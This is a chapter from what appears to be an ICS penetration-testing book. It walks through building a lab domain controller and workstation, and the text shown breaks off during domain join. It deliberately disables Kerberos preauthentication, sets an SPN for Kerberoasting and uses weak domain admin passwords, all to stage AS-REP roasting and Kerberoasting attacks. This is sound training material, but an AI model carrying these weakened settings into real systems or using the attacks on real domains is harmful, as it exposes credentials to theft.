<html><head></head><body>
		<div id="_idContainer444">
			<h1 id="_idParaDest-102"><em class="italic"><a id="_idTextAnchor112"/>Chapter 10</em>: I Can Do It 420</h1>
			<p>Up till now, there has been a heavy focus on automation – understanding what a PLC is and how it communicates. A key topic discussed was connectivity – specifically, connecting the PLC to the physical I/O, and also connecting it back up to SCADA. We also learned about Modbus and Ethernet/IP, and how to interact with the I/O. Additionally, we discussed using various tools to scan and enumerate ports and services in order to discover what protocols could be running in the environment. In the last chapter, we looked at using Burp Suite to interact with Ignition, our web-hosted SCADA system. All these tools and skills are critical to completing a successful engagement. However, we have in actuality spent most of our time looking at the SCADA and physical hardware side of the network. Depending on your engagement, typically considered <strong class="bold">white box</strong>, it is possible that the customer will drop you into the ICS network and basically give you free run to do discovery, and provide you with the following: an <strong class="bold">Active Directory</strong> (<strong class="bold">AD</strong>) account and a diagram of the ICS network. This allows you to avoid the pitfalls of traversing the corporate side of the network, and instead move down through <strong class="bold">demilitarized zones</strong>, past <strong class="bold">firewalls</strong>, and into new <strong class="bold">domains</strong>. </p>
			<p>Justice wouldn't be done if this was all we focused on in this chapter. In most engagements, I have been typically thrown into the corporate side of the network, then asked to breach into the industrial network. Doing this requires an understanding of the technology present in the industrial network. This understanding will allow us to gain a foothold to go deeper into the network. Here, we are going to add a couple more elements to our ever-growing lab. We will be simulating a <strong class="bold">gray box</strong> test where you will be dropped into the <strong class="bold">corporate network</strong>, and subsequently discover a path through.</p>
			<p>In this chapter, we're going to cover the following main topics:</p>
			<ul>
				<li>Installing corporate environment elements</li>
				<li>Discovering and launching our attacks</li>
				<li>Getting shells</li>
			</ul>
			<h1 id="_idParaDest-103"><a id="_idTextAnchor113"/>Technical requirements</h1>
			<p>For this chapter, you will need the following:</p>
			<ul>
				<li>A Windows 2019 domain controller, installed and configured. Click on the following link to download an ISO for the server of your choice: <a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019</a>.</li>
				<li>A Windows 10 workstation connected to the domain controller. Click on the following link to get access to a Windows 10 ISO: <a href="https://www.microsoft.com/en-ca/software-download/windows10ISO">https://www.microsoft.com/en-ca/software-download/windows10ISO</a>. </li>
				<li>A Kali Linux VM already running, and with the following tools installed:<ul><li><strong class="bold">Impacket<a id="_idTextAnchor114"/></strong>: This is available here: <a href="https://github.com/SecureAuthCorp/impacket/releases">https://github.com/SecureAuthCorp/impacket/releases</a>.</li><li><strong class="bold">Kerbrute</strong>: This is available here: <a href="https://github.com/ropnop/kerbrute/releases/tag/v1.0.3">https://github.com/ropnop/kerbrute/releases/tag/v1.0.3</a>. </li><li><strong class="bold">Evil-WinRM</strong>: This is available here: <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a>. </li></ul></li>
			</ul>
			<p>You can view this chapter's code in action here: <a href="https://bit.ly/3AzpxFp">https://bit.ly/3AzpxFp</a></p>
			<h1 id="_idParaDest-104"><a id="_idTextAnchor115"/>Installing corporate environment elements</h1>
			<p>In <a href="B16321_01_Epub_AM.xhtml#_idTextAnchor013"><em class="italic">Chapter 1</em></a>, <em class="italic">Using Virtualization</em>, we<a id="_idIndexMarker587"/> installed four <strong class="bold">virtual machines</strong> (<strong class="bold">VMs</strong>), consisting<a id="_idIndexMarker588"/> of two Ubuntu, one Windows 7, and one Kali Linux distribution. We then proceeded to create subnets based<a id="_idIndexMarker589"/> on the <strong class="bold">Purdue model</strong>, and then assigned static IP addresses to those individual VMs, aligning them individually to their respective organizational network levels. In this section, we are going to add the corporate side of an ICS lab by <a id="_idIndexMarker590"/>setting up a Windows 2019 domain controller <a id="_idIndexMarker591"/>running AD, <strong class="bold">Domain Name System</strong> (<strong class="bold">DNS</strong>), and a <strong class="bold">Dynamic Host Configuration Protocol</strong> (<strong class="bold">DHCP</strong>) server. We will also connect a Windows 10 workstation to the domain. As a refresher, our lab should currently look something like the following figure:</p>
			<div>
				<div id="_idContainer376" class="IMG---Figure">
					<img src="image/Figure_10.01_B16321.jpg" alt="Figure 10.1 – Current lab layout&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 1<a id="_idTextAnchor116"/>0.1 – Current lab layout</p>
			<p>Once you complete the setup of the domain controller and workstation, your network layout should<a id="_idIndexMarker592"/> appear similar to the following figure:</p>
			<div>
				<div id="_idContainer377" class="IMG---Figure">
					<img src="image/Figure_10.02_B16321.jpg" alt="Figure 10.2 – Corporate lab additions&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.2 – Corporate lab additions</p>
			<p>Next, we'll take a look at installing and configuring the domain controller.</p>
			<h2 id="_idParaDest-105"><a id="_idTextAnchor117"/>Installing and configuring the domain controller</h2>
			<p>Navigate<a id="_idIndexMarker593"/> to the following <a id="_idIndexMarker594"/>link <a id="_idIndexMarker595"/>to find the ISO related to the domain controller lab: <a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2019</a>.</p>
			<p>I am now going to list the steps that we will take to install and configure the domain controller. However, I will not cover some of the more obvious steps, nor will I restate anything that we covered in <a href="B16321_01_Epub_AM.xhtml#_idTextAnchor013"><em class="italic">Chapter 1</em></a>, <em class="italic">Using Virtualization</em>. If you need a refresher on getting an ISO into the datastore of your ESXi server, I recommend going back to <a href="B16321_01_Epub_AM.xhtml#_idTextAnchor013"><em class="italic">Chapter 1</em></a>, <em class="italic">Using Virtualization</em>. The following are the steps required:  </p>
			<ol>
				<li>I am going to assume that you can get the ISO spun up, as well as getting the domain controller to the Windows Update portion of the steps. Now refer to the following screenshot, as this is where we will pick up the installation and configuration portion:<p class="figure-caption"> </p><div id="_idContainer378" class="IMG---Figure"><img src="image/Figure_10.03_B16321.jpg" alt="Figure 10.3 – Windows Update&#13;&#10;"/></div><p class="figure-caption">Figure 10.3 – Windows Update</p></li>
				<li>From <a id="_idIndexMarker596"/>here we <a id="_idIndexMarker597"/>want<a id="_idIndexMarker598"/> to disable the <strong class="bold">VM Network</strong> interface and set a static IP address to <strong class="source-inline">127.0.0.1</strong> for the preferred DNS server, as shown in the following screenshot:<p class="figure-caption"> </p><div id="_idContainer379" class="IMG---Figure"><img src="image/Figure_10.04_B16321.jpg" alt="Figure 10.4 – Enterprise interface&#13;&#10;"/></div><p class="figure-caption">Figure 10.4 – Enterprise interface</p></li>
				<li>Next, we <a id="_idIndexMarker599"/>are <a id="_idIndexMarker600"/>going<a id="_idIndexMarker601"/> to change the name of the machine. I will be using the name <strong class="source-inline">dc01</strong>, as shown in the following screenshot:<p class="figure-caption"> </p><div id="_idContainer380" class="IMG---Figure"><img src="image/Figure_10.05_B16321.jpg" alt="Figure 10.5 – Changing the name of the machine&#13;&#10;"/></div><p class="figure-caption">Figure 10.5 – Changing the name of the machine</p></li>
				<li>Your machine will now require a restart to have the name change be applied. You will be prompted with a popup that allows you to restart the system. Once the server reboots, we want to navigate to the <strong class="bold">Server Manager</strong> screen and select <strong class="bold">Add roles and features</strong>, as <a id="_idIndexMarker602"/>seen <a id="_idIndexMarker603"/>in<a id="_idIndexMarker604"/> the next screenshot:<div id="_idContainer381" class="IMG---Figure"><img src="image/Figure_10.06_B16321.jpg" alt="Figure 10.6 – Add roles and features&#13;&#10;"/></div><p class="figure-caption">Figure 10.6 – Add roles and features</p><p>You will be prompted with a <strong class="bold">Select installation type</strong> screen, where you want to select <strong class="bold">Next &gt;</strong>, as seen in the following screenshot:</p><p class="figure-caption"> </p><div id="_idContainer382" class="IMG---Figure"><img src="image/Figure_10.07_B16321.jpg" alt="Figure 10.7 – Select installation type&#13;&#10;"/></div><p class="figure-caption">Figure 10.7 – Select installation type</p></li>
				<li>Next, you <a id="_idIndexMarker605"/>will <a id="_idIndexMarker606"/>be <a id="_idIndexMarker607"/>presented with a <strong class="bold">Select destination server</strong> screen, and from here you want to make sure that you have selected your primary server and clicked<strong class="bold"> Next &gt;</strong>, as shown in the following screenshot:<p class="figure-caption"> </p><div id="_idContainer383" class="IMG---Figure"><img src="image/Figure_10.08_B16321.jpg" alt="Figure 10.8 – Select destination server&#13;&#10;"/></div><p class="figure-caption">Figure 10.8 – Select destination server</p></li>
				<li>From <a id="_idIndexMarker608"/>here, you <a id="_idIndexMarker609"/>will<a id="_idIndexMarker610"/> be presented with a series of roles that you can choose from. We want to select <strong class="bold">Active Directory Domain Services</strong>, <strong class="bold">DHCP Server</strong>, and <strong class="bold">DNS Server</strong>, as shown in the following screenshot:<div id="_idContainer384" class="IMG---Figure"><img src="image/Figure_10.09_B16321.jpg" alt="Figure 10.9 – Select server roles&#13;&#10;"/></div><p class="figure-caption">Figure 10.9 – Select server roles</p></li>
				<li>After <a id="_idIndexMarker611"/>selecting <a id="_idIndexMarker612"/>each <a id="_idIndexMarker613"/>checkbox, you will be presented with a popup that provides details on the role that you will be installing. Click the <strong class="bold">Add feature</strong> button to confirm each role is selected. You will then see the <strong class="bold">Select features</strong> window. Simply click <strong class="bold">Next &gt;</strong> without selecting any features (except for the ones which are selected by default) to continue the installation process, as shown in the following screenshot:<div id="_idContainer385" class="IMG---Figure"><img src="image/Figure_10.10_B16321.jpg" alt="Figure 10.10 – Select features&#13;&#10;"/></div><p class="figure-caption">Figure 10.10 – Select features</p></li>
				<li>Click <a id="_idIndexMarker614"/>the <strong class="bold">Next &gt;</strong> button <a id="_idIndexMarker615"/>through<a id="_idIndexMarker616"/> the <strong class="bold">AD DS</strong>, <strong class="bold">DHCP Server</strong>, and <strong class="bold">DNS Server</strong> info screens. You will then arrive at the <strong class="bold">Confirm installation selections</strong> screen, where you can continue by clicking the <strong class="bold">Install</strong> button:<div id="_idContainer386" class="IMG---Figure"><img src="image/Figure_10.11_B16321.jpg" alt="Figure 10.11 – Confirm installation selections&#13;&#10;"/></div><p class="figure-caption">Figure 10.11 – Confirm installation selections</p></li>
				<li>Once installed, you will be brought to an <strong class="bold">Installation progress</strong> screen where you<a id="_idIndexMarker617"/> will <a id="_idIndexMarker618"/>click<a id="_idIndexMarker619"/> the <strong class="bold">Promote this server to a domain controller</strong> option, as shown in the following screenshot:<div id="_idContainer387" class="IMG---Figure"><img src="image/Figure_10.12_B16321.jpg" alt="Figure 10.12 – Promoting the domain controller&#13;&#10;"/></div><p class="figure-caption">Figure 10.12 – Promoting the domain controller</p></li>
				<li>Here, you are going to select the <strong class="bold">Add a new forest</strong> option. Then set the domain name to <strong class="source-inline">labcorp.local</strong> and click the <strong class="bold">Next &gt;</strong> button:<div id="_idContainer388" class="IMG---Figure"><img src="image/Figure_10.13_B16321.jpg" alt="Figure 10.13 – Deployment Configuration&#13;&#10;"/></div><p class="figure-caption">Figure 10.13 – Deployment Configuration</p></li>
				<li>Next, you<a id="_idIndexMarker620"/> will <a id="_idIndexMarker621"/>see <strong class="bold">Domain Controller Options</strong>. Keep<a id="_idIndexMarker622"/> everything <a id="_idIndexMarker623"/>as it is and set your <strong class="bold">Directory Services Restore Mode</strong> (<strong class="bold">DSRM</strong>) password, as shown in the following screenshot:<div id="_idContainer389" class="IMG---Figure"><img src="image/Figure_10.14_B16321.jpg" alt="Figure 10.14 – Domain Controller Options&#13;&#10;"/></div><p class="figure-caption">Figure 10.14 – Domain Controller Options</p></li>
				<li>Click <strong class="bold">Next &gt;</strong> through <a id="_idIndexMarker624"/>the<a id="_idIndexMarker625"/> DNS<a id="_idIndexMarker626"/> options without selecting <strong class="bold">Create DNS delegation</strong>. You then will be presented with <strong class="bold">Additional Options</strong>. In this window, the NetBIOS domain name will be auto-generated for you. Cl<a id="_idTextAnchor118"/>ick <strong class="bold">Next &gt; </strong>and then click <strong class="bold">Next &gt;</strong> again on the <strong class="bold">Paths</strong> screen. Click <strong class="bold">Next &gt;</strong> once again on the <strong class="bold">Review Options</strong> screen. Doing this will begin the prerequisites check. From here, we want to click <strong class="bold">Install</strong>, as depicted in the following screenshot:<div id="_idContainer390" class="IMG---Figure"><img src="image/Figure_10.15_B16321.jpg" alt="Figure 10.15 – Prerequisites Check &#13;&#10;"/></div><p class="figure-caption">Figure 10.15 – Prerequisites Check </p></li>
				<li>Once<a id="_idIndexMarker627"/> the<a id="_idIndexMarker628"/> installation<a id="_idIndexMarker629"/> finishes, you will be logged out and the server will reboot. Once the system comes back up, you will see that you now have a <strong class="bold">LABCORP</strong> domain, as shown in the following screenshot:<div id="_idContainer391" class="IMG---Figure"><img src="image/Figure_10.16_B16321.jpg" alt="Figure 10.16 – LABCORP domain&#13;&#10;"/></div><p class="figure-caption">Figure 10.16 – LABCORP domain</p></li>
				<li>Now that we have AD installed, we want to quickly add a domain admin to continue <a id="_idIndexMarker630"/>with the next two server configurations. Go ahead and add a new <a id="_idIndexMarker631"/>user <a id="_idIndexMarker632"/>under <strong class="bold">Active Directory Users and Computers</strong>, as shown here:<div id="_idContainer392" class="IMG---Figure"><img src="image/Figure_10.17_B16321.jpg" alt="Figure 10.17 – Users and Computers&#13;&#10;"/></div><p class="figure-caption">Figure 10.17 – Users and Computers</p></li>
				<li>I have<a id="_idIndexMarker633"/> used <strong class="source-inline">lab.da:Password123</strong> as my credentials and set the new user to be a member of <strong class="bold">Domain Admins</strong>, as shown here:<div id="_idContainer393" class="IMG---Figure"><img src="image/Figure_10.18_B16321.jpg" alt="Figure 10.18 – Domain Admins&#13;&#10;"/></div><p class="figure-caption">Figure 10.18 – Domain Admins</p><p>Since you <a id="_idIndexMarker634"/>are <a id="_idIndexMarker635"/>already <a id="_idIndexMarker636"/>adding a domain admin, you will continue and add <strong class="source-inline">LabGroups</strong> and <strong class="source-inline">LabUsers</strong> as an organizational unit under the <strong class="source-inline">labcorp.local</strong> domain, as shown here:</p><div id="_idContainer394" class="IMG---Figure"><img src="image/Figure_10.19_B16321.jpg" alt="Figure 10.19 – Organizational groups&#13;&#10;"/></div><p class="figure-caption">Figure 10.19 – Organizational groups</p></li>
				<li>Next, you<a id="_idIndexMarker637"/> will <a id="_idIndexMarker638"/>create a<a id="_idIndexMarker639"/> group under the <strong class="source-inline">LabGroups</strong> organizational unit, named <strong class="source-inline">Scada</strong>:</li>
			</ol>
			<div>
				<div id="_idContainer395" class="IMG---Figure">
					<img src="image/Figure_10.20_B16321.jpg" alt="Figure 10.20 – Scada group&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.20 – Scada group</p>
			<p>Now, you want to create three new users and add them to the <strong class="source-inline">LabUsers</strong> organizational unit. The users will be as follows:</p>
			<ul>
				<li><strong class="source-inline">operator1</strong>/<strong class="source-inline">Password1</strong></li>
				<li><strong class="source-inline">operator2</strong>/<strong class="source-inline">Password2</strong></li>
				<li><strong class="source-inline">operator3</strong>/<strong class="source-inline">Password3</strong></li>
			</ul>
			<p>Here<a id="_idIndexMarker640"/> is <a id="_idIndexMarker641"/>an example using <strong class="source-inline">operator1</strong>, setting<a id="_idIndexMarker642"/> the password to be <strong class="source-inline">Password1234</strong>, and making them a member of <strong class="bold">Scada</strong>:</p>
			<div>
				<div id="_idContainer396" class="IMG---Figure">
					<img src="image/Figure_10.21_B16321.jpg" alt="Figure 10.21 – LabUsers operator1&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.21 – LabUsers operator1</p>
			<p>When creating the <strong class="source-inline">operator2</strong> account, we are going to adjust a particular setting that will be discussed in the next section. Under <strong class="bold">Users and Computers</strong>, we want to select <strong class="bold">operator2</strong>, and then select the <strong class="bold">Account</strong> tab. Then, under the <strong class="bold">Account</strong> options, select the <strong class="bold">Do not require Kerberos preauthentication option</strong>. This is ultimately a protection mechanism against Kerberos brute force. If it is disabled, we can capture hashes for<a id="_idIndexMarker643"/> the<a id="_idIndexMarker644"/> users that are not using this <a id="_idIndexMarker645"/>feature:</p>
			<div>
				<div id="_idContainer397" class="IMG---Figure">
					<img src="image/Figure_10.22_B16321.jpg" alt="Figure 10.22 – Disable Kerberos preauthentication&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.22 – Disable Kerberos preauthentication</p>
			<p>Now that we have disabled Kerberos preauthentication, we will continue installing and configuring the DNS server.</p>
			<h2 id="_idParaDest-106"><a id="_idTextAnchor119"/>Adding and installing the DNS server </h2>
			<p>The next <a id="_idIndexMarker646"/>step <a id="_idIndexMarker647"/>will be to sign out of the local administrator <a id="_idIndexMarker648"/>account and log back into the server as <strong class="source-inline">labcorp\lab.da</strong> to continue with the configuration of the DNS server:</p>
			<ol>
				<li value="1">On the <strong class="bold">Server Manager</strong> dashboard, select the <strong class="bold">DNS</strong> option from the menu on the left-hand side. This will bring up a list of servers that can be configured for the DNS. Select the <strong class="bold">DC01</strong> server and right-click on it. This will bring up a context menu, allowing us to select <strong class="bold">DNS Manager</strong>:<div id="_idContainer398" class="IMG---Figure"><img src="image/Figure_10.23_B16321.jpg" alt="Figure 10.23 – DNS server&#13;&#10;"/></div><p class="figure-caption">Figure 10.23 – DNS server</p></li>
				<li><strong class="bold">DNS Manager</strong> will generate a popup, listing the servers that you have the ability to add zones to. We are going to create a new zone under the <strong class="source-inline">Reverse Lookup Zones</strong> folder:<div id="_idContainer399" class="IMG---Figure"><img src="image/Figure_10.24_B16321.jpg" alt="Figure 10.24 – DNS Manager&#13;&#10;"/></div><p class="figure-caption">Figure 10.24 – DNS Manager</p></li>
				<li>Here, we <a id="_idIndexMarker649"/>want<a id="_idIndexMarker650"/> to<a id="_idIndexMarker651"/> select <strong class="bold">Primary zone</strong> and then click the <strong class="bold">Next &gt;</strong> button:<div id="_idContainer400" class="IMG---Figure"><img src="image/Figure_10.25_B16321.jpg" alt="Figure 10.25 – New zone wizard&#13;&#10;"/></div><p class="figure-caption">Figure 10.25 – New zone wizard</p></li>
				<li>Then, we want to select the option to replicate on all domain controllers in the <strong class="source-inline">labcorp.local</strong> domain. Click the <strong class="bold">Next &gt;</strong> button and then select the <strong class="bold">Ipv4 Reverse Lookup Zone option</strong>, and proceed by clicking <strong class="bold">Next &gt;</strong> again. After these two <a id="_idIndexMarker652"/>screens, you will be<a id="_idIndexMarker653"/> brought to a<a id="_idIndexMarker654"/> screen where you can declare the network ID for <strong class="bold">Reverse Lookup Zone Name</strong>:<div id="_idContainer401" class="IMG---Figure"><img src="image/Figure_10.26_B16321.jpg" alt="Figure 10.26 – Reverse Lookup Zone Name&#13;&#10;"/></div><p class="figure-caption">Figure 10.26 – Reverse Lookup Zone Name</p></li>
				<li>Click <strong class="bold">Next &gt;</strong> on the <strong class="bold">Dynamic Update</strong> screen, then finally click <strong class="bold">Finish</strong>. You will now see a reverse zone established and running. Next, we want to set the resource scavenging by right-clicking on the server and selecting <strong class="bold">Set Aging/Scavenging for All Zones…</strong>:<div id="_idContainer402" class="IMG---Figure"><img src="image/Figure_10.27_B16321.jpg" alt="Figure 10.27 – Scavenging for all zones&#13;&#10;"/></div><p class="figure-caption">Figure 10.27 – Scavenging for all zones</p></li>
				<li>Set<a id="_idIndexMarker655"/> the<a id="_idIndexMarker656"/> option to <strong class="bold">Scavenge stale resource records</strong>, and<a id="_idIndexMarker657"/> then apply the settings shown i<a id="_idTextAnchor120"/>n the following screenshot:</li>
			</ol>
			<div>
				<div id="_idContainer403" class="IMG---Figure">
					<img src="image/Figure_10.28_B16321.jpg" alt="Figure 10.28 – Set Aging/Scavenging Properties&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.28 – Set Aging/Scavenging Properties</p>
			<p>After you have set the aging/scavenging properties, you will have finished configuring the DNS <a id="_idIndexMarker658"/>server. Now, we will continue<a id="_idIndexMarker659"/> by installing and configuring the<a id="_idIndexMarker660"/> DHCP server.</p>
			<h2 id="_idParaDest-107"><a id="_idTextAnchor121"/>Adding and installing the DHCP server </h2>
			<p>We have <a id="_idIndexMarker661"/>completed the setup for<a id="_idIndexMarker662"/> the DNS server. Now, we<a id="_idIndexMarker663"/> will move on to the addition and installation of the DHCP server, by taking the following steps:</p>
			<ol>
				<li value="1">Clicking the <strong class="bold">DHCP</strong> option on the left-hand side menu will bring up the list of servers. You should see a notification – <strong class="bold">Configuration required for DHCP Server at DC01</strong>. Right-click on the server and select <strong class="bold">DHCP Manager</strong>:<div id="_idContainer404" class="IMG---Figure"><img src="image/Figure_10.29_B16321.jpg" alt="Figure 10.29 – DHCP server configuration&#13;&#10;"/></div><p class="figure-caption">Figure 10.29 – DHCP server configuration</p><p>You will then be presented with the following screen:</p><div id="_idContainer405" class="IMG---Figure"><img src="image/Figure_10.30_B16321.jpg" alt="Figure 10.30 – DHCP Manager&#13;&#10;"/></div><p class="figure-caption">Figure 10.30 – DHCP Manager</p></li>
				<li>Right-click <a id="_idIndexMarker664"/>on<a id="_idIndexMarker665"/> the <strong class="source-inline">dc01.labcorp.local</strong> server<a id="_idIndexMarker666"/> and select <strong class="bold">Authorize</strong> from the context menu:<div id="_idContainer406" class="IMG---Figure"><img src="image/Figure_10.31_B16321.jpg" alt="Figure 10.31 – Context menu&#13;&#10;"/></div><p class="figure-caption">Figure 10.31 – Context menu</p></li>
				<li>After <a id="_idIndexMarker667"/>authorization, we <a id="_idIndexMarker668"/>are <a id="_idIndexMarker669"/>going to add a new scope for IPv4. Right-click the <strong class="bold">IPv4</strong> icon and select <strong class="bold">New Scope...</strong>:<div id="_idContainer407" class="IMG---Figure"><img src="image/Figure_10.32_B16321.jpg" alt="Figure 10.32 – IPv4 new scope&#13;&#10;"/></div><p class="figure-caption">Figure 10.32 – IPv4 new scope</p></li>
				<li>This will <a id="_idIndexMarker670"/>bring <a id="_idIndexMarker671"/>up a series of configuration<a id="_idIndexMarker672"/> screens. Click through the screens and give your scope a name. I used <strong class="source-inline">Lab Corp</strong> as a name to keep things simple. Next, you will be brought to an <strong class="bold">IP Address Range</strong> configuration screen, where you will need to enter your starting and ending IP address. The next screen shows the options that I have picked:<div id="_idContainer408" class="IMG---Figure"><img src="image/Figure_10.33_B16321.jpg" alt="Figure 10.33 – IP Address Range&#13;&#10;"/></div><p class="figure-caption">Figure 10.33 – IP Address Range</p></li>
				<li>For<a id="_idIndexMarker673"/> the <strong class="bold">Add Exclusions and Delay</strong> option, I<a id="_idIndexMarker674"/> simply<a id="_idIndexMarker675"/> left it blank and clicked the <strong class="bold">Next &gt; </strong>button. For the <strong class="bold">Lease Duration</strong> option, I set it to <strong class="bold">8</strong> days and clicked <strong class="bold">Next &gt;</strong>. After doing this, you will be brought to a screen where you want to select <strong class="bold">Yes</strong> to apply these options. After doing this, click the <strong class="bold">Next &gt;</strong> button. On the <strong class="bold">Router</strong> screen, I didn't make any changes and clicked <strong class="bold">Next &gt;</strong>. If everything was configured in the correct order, you should now see a <strong class="bold">Domain Name and DNS Servers</strong> screen that should be auto-populated, as shown in the following screenshot:<div id="_idContainer409" class="IMG---Figure"><img src="image/Figure_10.34_B16321.jpg" alt="Figure 10.34 – DNS servers screen&#13;&#10;"/></div><p class="figure-caption">Figure 10.34 – DNS servers screen</p></li>
				<li>Click <strong class="bold">Next &gt;</strong> through<a id="_idIndexMarker676"/> the<a id="_idIndexMarker677"/> subsequent<a id="_idIndexMarker678"/> screens, and make sure you select <strong class="bold">Yes</strong> to activate the scope. Finally, click the <strong class="bold">Finish</strong> button. Now, we want to run the post configuration by clicking the <strong class="bold">More</strong> link on the notification banner that we saw earlier. This brings us to a screen with the <strong class="bold">Post-deployment Configuration</strong> option, where we want to click <strong class="bold">Complete DHCP configuration</strong>:<div id="_idContainer410" class="IMG---Figure"><img src="image/Figure_10.35_B16321.jpg" alt="Figure 10.35 – Complete DHCP configuration&#13;&#10;"/></div><p class="figure-caption">Figure 10.35 – Complete DHCP configuration</p></li>
				<li>This<a id="_idIndexMarker679"/> will <a id="_idIndexMarker680"/>bring<a id="_idIndexMarker681"/> you to the following <strong class="bold">Authorization</strong> screen, where you will want to click the <strong class="bold">Commit</strong> button and then <strong class="bold">Close</strong>:</li>
			</ol>
			<div>
				<div id="_idContainer411" class="IMG---Figure">
					<img src="image/Figure_10.36_B16321.jpg" alt="Figure 10.36 – Authorization&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.36 – Authorization</p>
			<p>We should now have a fully <a id="_idIndexMarker682"/>configured domain controller running AD, DNS, and <a id="_idIndexMarker683"/>DHCP <a id="_idIndexMarker684"/>servers. </p>
			<h2 id="_idParaDest-108"><a id="_idTextAnchor122"/>Adding and installing network file sharing</h2>
			<p>Next, we <a id="_idIndexMarker685"/>are going to simulate<a id="_idIndexMarker686"/> network <a id="_idIndexMarker687"/>file sharing by clicking on <strong class="bold">File and Storage Services</strong>, selecting <strong class="bold">TASKS</strong>, and clicking on <strong class="bold">New Share…</strong>, as shown in the following screenshot:</p>
			<p class="figure-caption"> </p>
			<div>
				<div id="_idContainer412" class="IMG---Figure">
					<img src="image/Figure_10.37_B16321.jpg" alt="Figure 10.37 – File and Storage Services&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.37 – File and Storage Services</p>
			<p>In the next <a id="_idIndexMarker688"/>screenshot, you<a id="_idIndexMarker689"/> can see that we have five options for two protocols:</p>
			<ul>
				<li><strong class="bold">Server Message Block</strong> (<strong class="bold">SMB</strong>)</li>
				<li><strong class="bold">Network File System</strong> (<strong class="bold">NFS</strong>)</li>
			</ul>
			<p>If you recall in <a href="B16321_06_Epub_AM.xhtml#_idTextAnchor063"><em class="italic">Chapter 6</em></a>, <em class="italic">Packet Deep Dive</em>, we discussed that these protocols are commonly found inside of a corporate network. Here is one of the primary sources of those protocols. We want to generate <strong class="bold">SMB Share – Quick</strong>, as shown in the following screenshot:</p>
			<p class="figure-caption"> </p>
			<div>
				<div id="_idContainer413" class="IMG---Figure">
					<img src="image/Figure_10.38_B16321.jpg" alt="Figure 10.38 – SMB and NFS share selection&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.38 – SMB and NFS share selection</p>
			<p>In the <a id="_idIndexMarker690"/>next <a id="_idIndexMarker691"/>step, we will select the server and share <a id="_idIndexMarker692"/>the location as follows:</p>
			<ul>
				<li><strong class="source-inline">dc01</strong></li>
				<li><strong class="source-inline">C:</strong></li>
			</ul>
			<p>We are going to give <strong class="source-inline">LabFiles1</strong> as the <strong class="bold">share</strong> name, as this in turn will autogenerate the <strong class="bold">Local path to share</strong> and <strong class="bold">Remote path to share</strong> values, as shown in the following screenshot:</p>
			<p class="figure-caption"> </p>
			<div>
				<div id="_idContainer414" class="IMG---Figure">
					<img src="image/Figure_10.39_B16321.jpg" alt="Figure 10.39 – Specify share name&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.39 – Specify share name</p>
			<p>Now <a id="_idIndexMarker693"/>click the <strong class="bold">Next &gt;</strong> button<a id="_idIndexMarker694"/> on <a id="_idIndexMarker695"/>the <strong class="bold">Other Settings</strong>, <strong class="bold">Permissions</strong>, and <strong class="bold">Confirmation</strong> screens. Finally, click <strong class="bold">Create</strong>, and there you have it. An SMB file share has been created.</p>
			<h2 id="_idParaDest-109"><a id="_idTextAnchor123"/>Configuring Kerberos</h2>
			<p>We need <a id="_idIndexMarker696"/>to<a id="_idIndexMarker697"/> set up Kerberos on our domain controller to allow us to examine Kerberoasting, a common attack that can be used to exploit AD. Enter the following <a id="_idIndexMarker698"/>command to set up the <strong class="bold">service principal name</strong> (<strong class="bold">SPN</strong>), using <strong class="source-inline">operator3</strong> in this case:</p>
			<p class="source-code">setspn -a DC01/operator3.labcorp.local:9999 labcorp\operator3</p>
			<p>If the command is successful, you should see the following output:</p>
			<div>
				<div id="_idContainer415" class="IMG---Figure">
					<img src="image/Figure_10.40_B16321.jpg" alt="Figure 10.40 – SPN setup&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.40 – SPN setup</p>
			<p>Now that we have an SPN set, this concludes the steps for installing and configuring features on <a id="_idIndexMarker699"/>the domain controller. We can<a id="_idIndexMarker700"/> now move on to building the workstation.</p>
			<h2 id="_idParaDest-110"><a id="_idTextAnchor124"/>Installing and configuring workstations</h2>
			<p>Navigate<a id="_idIndexMarker701"/> to the following <a id="_idIndexMarker702"/>link to find the ISO<a id="_idIndexMarker703"/> related to Windows 10: <a href="https://www.microsoft.com/en-ca/software-download/windows10ISO">https://www.microsoft.com/en-ca/software-download/windows10ISO</a>. </p>
			<p>I am going to let you spin up the Windows 10 Pro for Workstations VM, and I will simply skip ahead to the step where we add the workstation to the domain:</p>
			<ol>
				<li value="1">After all the updates have been set, you will want to navigate to the Windows Start menu. From here, you will want to go to <strong class="bold">Settings</strong> | <strong class="bold">System</strong> | <strong class="bold">About</strong> | <strong class="bold">Rename this PC (advanced)</strong>, as shown in the following screenshot:<div id="_idContainer416" class="IMG---Figure"><img src="image/Figure_10.41_B16321.jpg" alt="Figure 10.41 – About PC&#13;&#10;"/></div><p class="figure-caption">Figure 10.41 – About PC</p></li>
				<li>Click <a id="_idIndexMarker704"/>the <strong class="bold">Rename this PC (advanced)</strong> link <a id="_idIndexMarker705"/>on <a id="_idIndexMarker706"/>this screen, and it will bring up the following <strong class="bold">System Properties</strong> screen:<div id="_idContainer417" class="IMG---Figure"><img src="image/Figure_10.42_B16321.jpg" alt="Figure 10.42 – System Properties&#13;&#10;"/></div><p class="figure-caption">Figure 10.42 – System Properties</p></li>
				<li>From here, click <a id="_idIndexMarker707"/>the <strong class="bold">Change...</strong> button to set <strong class="bold">Computer name</strong>. Then set the <strong class="bold">Domain</strong> name that the workstation can join, as shown here:<div id="_idContainer418" class="IMG---Figure"><img src="image/Figure_10.43_B16321.jpg" alt="Figure 10.43 – Computer name and domain&#13;&#10;"/></div><p class="figure-caption">Figure 10.43 – Computer name and domain</p></li>
